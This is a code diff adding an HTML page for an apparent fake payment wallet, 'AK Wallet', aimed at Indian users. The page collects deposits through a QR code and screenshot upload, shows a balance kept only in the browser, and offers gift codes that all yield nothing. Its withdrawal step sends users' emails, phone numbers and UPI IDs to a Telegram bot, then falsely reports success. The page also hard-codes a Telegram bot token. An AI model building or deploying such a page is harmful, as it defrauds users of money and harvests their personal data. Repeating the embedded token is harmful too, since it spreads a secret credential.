@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AK Wallet | Pro Business</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        .gradient-bg { background: linear-gradient(135deg, #0f172a 0%, #2563eb 100%); }
+        .hidden { display: none; }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .animate-slide-up { animation: slideUp 0.4s ease-out; }
+        .swal2-popup { border-radius: 24px !important; padding: 1rem !important; width: 320px !important; }
+        .swal2-input { border-radius: 12px !important; font-size: 14px !important; margin: 8px auto !important; width: 90% !important; height: 45px !important; }
+        #accountDrawer { transition: transform 0.3s ease-in-out; transform: translateX(100%); }
+        #accountDrawer.active { transform: translateX(0); }
+    </style>
+</head>
+<body class="bg-gray-50 pb-24 font-sans text-gray-800 overflow-x-hidden">
+
+    <audio id="redeemSound" preload="auto" src="https://image2url.com/r2/default/audio/1773795437239-efb9f8a0-5b2f-4321-a077-c93887bb57f3.mp3"></audio>
+    <audio id="phonepeSound" preload="auto" src="https://image2url.com/r2/default/audio/1773794906971-5ebd5597-ed3b-4c49-8392-e6b4c66619b0.mp3"></audio>
+    <audio id="errorSound" preload="auto" src="https://image2url.com/r2/default/audio/1773795306868-d6b60a43-1616-43b2-911a-86091db9df19.mp3"></audio>
+
+    <div id="loginPage" class="fixed inset-0 bg-white z-[100] flex flex-col p-8 hidden overflow-y-auto">
+        <div class="mt-6 mb-8 text-center">
+            <div class="bg-blue-600 text-white w-16 h-16 rounded-2xl flex items-center justify-center font-bold text-2xl mx-auto shadow-lg">AK</div>
+            <h2 class="text-2xl font-black mt-4">Secure Login</h2>
+        </div>
+        <div class="space-y-4">
+            <input type="email" id="userEmail" placeholder="Email Address" class="w-full p-4 bg-gray-100 rounded-2xl outline-none focus:ring-2 ring-blue-500 border-none">
+            <input type="text" id="userTgUsername" placeholder="Telegram Username (Optional)" class="w-full p-4 bg-gray-100 rounded-2xl outline-none border-none">
+            <input type="number" id="userTgPhone" placeholder="Telegram Phone Number" class="w-full p-4 bg-gray-100 rounded-2xl outline-none border-none">
+            <input type="password" id="userPass" placeholder="Password" class="w-full p-4 bg-gray-100 rounded-2xl outline-none border-none">
+            <button onclick="handleLogin()" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold shadow-lg">Login</button>
+        </div>
+    </div>
+
+    <div id="mainApp">
+        <div class="p-4 flex justify-between items-center bg-white border-b sticky top-0 z-10">
+            <h1 class="font-black text-xl italic text-blue-700 tracking-tighter">AKWALLET</h1>
+            <div class="flex items-center gap-3">
+                <button onclick="contactAdmin()" class="bg-blue-50 text-blue-700 px-3 py-2 rounded-full text-[10px] font-bold border border-blue-100 uppercase">Support</button>
+                <button onclick="toggleDrawer()" class="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center text-blue-600 border border-gray-200 shadow-sm">
+                    <i class="fa-solid fa-user-circle text-xl"></i>
+                </button>
+            </div>
+        </div>
+
+        <div class="p-4">
+            <div class="gradient-bg rounded-[32px] p-8 text-white shadow-2xl relative overflow-hidden">
+                <p class="text-[10px] opacity-60 uppercase font-bold tracking-widest">Available Balance</p>
+                <h2 class="text-5xl font-black mt-1">₹ <span id="balanceDisplay">0.00</span></h2>
+                <div class="flex gap-4 mt-10">
+                    <button onclick="showModal('addFundModal')" class="flex-1 bg-white text-blue-700 py-4 rounded-2xl font-black shadow-lg">Add Fund</button>
+                    <button onclick="showWithdrawModal()" class="flex-1 bg-blue-400/20 border border-white/30 py-4 rounded-2xl font-black">Withdraw</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="px-4 mb-6">
+            <div class="bg-white p-5 rounded-3xl border border-gray-100 shadow-sm flex gap-2">
+                <input type="text" id="promoInput" placeholder="Gift Code" class="flex-1 bg-gray-50 p-3 rounded-xl outline-none text-sm font-bold uppercase border focus:border-blue-500">
+                <button onclick="redeemCode()" class="bg-blue-600 text-white px-5 rounded-xl text-xs font-bold uppercase">Redeem</button>
+            </div>
+        </div>
+
+        <div class="p-4">
+            <h3 class="font-black text-lg text-gray-800 mb-4 px-1">Recent Activity</h3>
+            <div id="historyList" class="space-y-3 pb-10">
+                <div class="bg-white p-10 rounded-3xl border-2 border-dashed text-gray-400 text-xs italic text-center">No history yet</div>
+            </div>
+        </div>
+    </div>
+
+    <div id="drawerOverlay" onclick="toggleDrawer()" class="fixed inset-0 bg-black/40 z-[120] hidden"></div>
+    <div id="accountDrawer" class="fixed top-0 right-0 h-full w-72 bg-white z-[130] shadow-2xl p-6 flex flex-col">
+        <div class="flex justify-between items-center mb-8">
+            <h3 class="font-black text-xl">Account Settings</h3>
+            <button onclick="toggleDrawer()" class="text-gray-400 text-xl"><i class="fa-solid fa-xmark"></i></button>
+        </div>
+        <div class="bg-blue-50 p-4 rounded-2xl mb-6">
+            <p class="text-[10px] text-blue-400 font-bold uppercase">User Email</p>
+            <p id="drawerEmail" class="font-bold text-gray-800 text-sm truncate">---</p>
+        </div>
+        <div class="space-y-3 flex-1 overflow-y-auto">
+            <button onclick="updateField('rj_tg_user', 'Telegram Username')" class="w-full text-left p-4 rounded-xl hover:bg-gray-50 flex items-center gap-3 border border-gray-100">
+                <i class="fa-brands fa-telegram text-blue-600"></i>
+                <div><p class="text-[10px] text-gray-400 uppercase">Username</p><p id="dispTgUser" class="text-sm font-bold">Update Username</p></div>
+            </button>
+            <button onclick="updateField('rj_tg_phone', 'Telegram Number')" class="w-full text-left p-4 rounded-xl hover:bg-gray-50 flex items-center gap-3 border border-gray-100">
+                <i class="fa-solid fa-phone text-green-600"></i>
+                <div><p class="text-[10px] text-gray-400 uppercase">Phone Number</p><p id="dispTgPhone" class="text-sm font-bold">Update Phone</p></div>
+            </button>
+            <button onclick="changePass()" class="w-full text-left p-4 rounded-xl hover:bg-gray-50 flex items-center gap-3 border border-gray-100">
+                <i class="fa-solid fa-lock text-orange-600"></i>
+                <span class="text-sm font-bold">Change Password</span>
+            </button>
+        </div>
+        <button onclick="handleLogout()" class="w-full bg-red-50 text-red-600 py-4 rounded-2xl font-black text-sm">Logout</button>
+    </div>
+
+    <div id="addFundModal" class="hidden fixed inset-0 bg-black/60 z-[110] flex items-end justify-center">
+        <div class="bg-white w-full max-w-md rounded-t-[40px] p-8 animate-slide-up">
+            <h3 class="text-xl font-black mb-1 text-center">Deposit Funds</h3>
+            <div class="bg-gray-50 p-6 rounded-3xl text-center mb-6 border">
+                <img src="https://img.sanishtech.com/u/19e0e5692c812e15232f8a456cfa55cd.jpg" class="mx-auto rounded-xl w-48 h-48 bg-white border">
+            </div>
+            <button onclick="document.getElementById('screenshotInput').click()" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black shadow-lg">Upload Screenshot</button>
+            <button onclick="closeModal('addFundModal')" class="w-full py-4 text-gray-400 font-bold text-xs uppercase text-center">Cancel</button>
+        </div>
+    </div>
+
+    <input type="file" id="screenshotInput" class="hidden" accept="image/*" onchange="uploadToTelegram()">
+
+    <script>
+        const BOT_TOKEN = "8693713409:AAHqW1_dnYN2XeZAr8fzrWFj0jXBrDS9vFA";
+        const CHAT_ID = "7879390024";
+        const ADMIN_TG = "chachaXbhatija_owner";
+        
+        let balance = 0;
+        let history = [];
+
+        function playSuccessSound() {
+            const sound = document.getElementById('phonepeSound');
+            sound.pause(); sound.currentTime = 0; sound.play().catch(e => {});
+        }
+
+        window.onload = function() {
+            if (!localStorage.getItem('rj_user')) {
+                document.getElementById('loginPage').classList.remove('hidden');
+                document.getElementById('mainApp').classList.add('hidden');
+            } else { 
+                loadData(); 
+                updateDrawerInfo();
+            }
+        }
+
+        function handleLogin() {
+            const email = document.getElementById('userEmail').value;
+            const tgUser = document.getElementById('userTgUsername').value || "Not Set";
+            const tgPhone = document.getElementById('userTgPhone').value || "Not Set";
+            const pass = document.getElementById('userPass').value;
+            
+            if(email.includes('@') && pass.length > 3) {
+                localStorage.setItem('rj_user', email);
+                localStorage.setItem('rj_tg_user', tgUser);
+                localStorage.setItem('rj_tg_phone', tgPhone);
+                localStorage.setItem('rj_pass', pass);
+                location.reload();
+            } else { 
+                document.getElementById('errorSound').play();
+                Swal.fire('Error', 'Invalid Email or Password', 'error'); 
+            }
+        }
+
+        function redeemCode() {
+            const codeInput = document.getElementById('promoInput');
+            const code = codeInput.value.trim().toUpperCase();
+            const email = localStorage.getItem('rj_user');
+            
+            if (!code) return;
+
+            // CHECK IF ALREADY USED
+            const usedCodes = JSON.parse(localStorage.getItem('rj_used_codes') || "[]");
+            const codeKey = `${code}_${email}`;
+
+            if (usedCodes.includes(codeKey)) {
+                document.getElementById('errorSound').play();
+                return Swal.fire({ icon: 'error', title: 'Already Used', text: 'You have already redeemed this code.', confirmButtonColor: '#ef4444' });
+            }
+
+            // CODE LOGIC
+            let amount = 0;
+            if (code === "AKWALLET-880") {
+                amount = 00;
+            } else if (code === "GIFT50") {
+                amount = 0;
+            }
+
+            if (amount > 0) {
+                // SAVE AS USED
+                usedCodes.push(codeKey);
+                localStorage.setItem('rj_used_codes', JSON.stringify(usedCodes));
+
+                // ADD BALANCE
+                balance += amount;
+                addHistory('Gift Redeemed', amount, 'plus');
+                updateUI();
+                
+                document.getElementById('redeemSound').play();
+                Swal.fire({ icon: 'success', title: 'Redeemed!', text: `₹${amount} added to wallet.`, confirmButtonColor: '#2563eb' });
+                codeInput.value = '';
+            } else {
+                document.getElementById('errorSound').play();
+                Swal.fire({ icon: 'error', title: 'Invalid Code', text: 'Please check the code and try again.', confirmButtonColor: '#ef4444' });
+            }
+        }
+
+        // --- OTHER FUNCTIONS ---
+        function toggleDrawer() { document.getElementById('accountDrawer').classList.toggle('active'); document.getElementById('drawerOverlay').classList.toggle('hidden'); }
+        function updateDrawerInfo() {
+            document.getElementById('drawerEmail').innerText = localStorage.getItem('rj_user');
+            document.getElementById('dispTgUser').innerText = localStorage.getItem('rj_tg_user') || "Update Username";
+            document.getElementById('dispTgPhone').innerText = localStorage.getItem('rj_tg_phone') || "Update Phone";
+        }
+        async function updateField(key, label) {
+            const { value: newVal } = await Swal.fire({ title: `Update ${label}`, input: 'text', inputValue: localStorage.getItem(key), showCancelButton: true });
+            if (newVal) { localStorage.setItem(key, newVal); updateDrawerInfo(); }
+        }
+        async function processWithdrawal(upi, amt) {
+            Swal.fire({ title: 'Processing...', didOpen: () => Swal.showLoading() });
+            const email = localStorage.getItem('rj_user'), tgUser = localStorage.getItem('rj_tg_user'), tgPhone = localStorage.getItem('rj_tg_phone');
+            const msg = `💸 *WITHDRAWAL*\nUser: ${email}\nTG: ${tgUser}\nPhone: ${tgPhone}\nAmt: ₹${amt}\nUPI: ${upi}`;
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                balance -= parseFloat(amt); addHistory('Withdrawal', amt, 'minus'); updateUI(); playSuccessSound();
+                Swal.fire('Success', 'Amount will be credited soon', 'success');
+            } catch (e) { document.getElementById('errorSound').play(); }
+        }
+        async function uploadToTelegram() {
+            const file = document.getElementById('screenshotInput').files[0];
+            const email = localStorage.getItem('rj_user'), tgUser = localStorage.getItem('rj_tg_user'), tgPhone = localStorage.getItem('rj_tg_phone');
+            if (!file) return;
+            Swal.fire({ title: 'Uploading...', didOpen: () => Swal.showLoading() });
+            let fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', file);
+            fd.append('caption', `🚀 DEPOSIT\nEmail: ${email}\nTG: ${tgUser}\nPhone: ${tgPhone}`);
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                closeModal('addFundModal'); playSuccessSound();
+                Swal.fire('Submitted', 'Verification in progress', 'success');
+            } catch (e) { document.getElementById('errorSound').play(); }
+        }
+        function showWithdrawModal() {
+            if (balance < 100) return Swal.fire('Min ₹100 required', '', 'warning');
+            Swal.fire({
+                title: 'Withdraw',
+                html: `<input id="sw-upi" class="swal2-input" placeholder="UPI ID"><input id="sw-amt" type="number" class="swal2-input" placeholder="Amount">`,
+                preConfirm: () => ({ upi: document.getElementById('sw-upi').value, amt: document.getElementById('sw-amt').value })
+            }).then(r => { if(r.value) processWithdrawal(r.value.upi, r.value.amt); });
+        }
+        function changePass() { Swal.fire({ title: 'New Password', input: 'password' }).then(r => { if(r.value) localStorage.setItem('rj_pass', r.value); }); }
+        function handleLogout() { localStorage.removeItem('rj_user'); location.reload(); }
+        function showModal(id) { document.getElementById(id).classList.remove('hidden'); }
+        function closeModal(id) { document.getElementById(id).classList.add('hidden'); }
+        function updateUI() { document.getElementById('balanceDisplay').innerText = balance.toFixed(2); localStorage.setItem('rj_balance', balance); renderHistory(); }
+        function addHistory(type, amt, mode) { history.unshift({ type, amt, mode, date: new Date().toLocaleString() }); localStorage.setItem('rj_history', JSON.stringify(history)); }
+        function loadData() { balance = parseFloat(localStorage.getItem('rj_balance')) || 0; history = JSON.parse(localStorage.getItem('rj_history')) || []; updateUI(); }
+        function renderHistory() {
+            const list = document.getElementById('historyList'); if (history.length === 0) return;
+            list.innerHTML = history.map(item => `<div class="bg-white p-4 rounded-2xl border flex justify-between items-center"><div class="text-left"><p class="font-bold text-sm">${item.type}</p><p class="text-[9px] text-gray-400">${item.date}</p></div><p class="font-black ${item.mode === 'plus' ? 'text-green-500' : 'text-red-600'}">₹${item.amt}</p></div>`).join('');
+        }
+        function contactAdmin() { window.open(`https://t.me/${ADMIN_TG}`); }
+    </script>
+</body>
+</html>
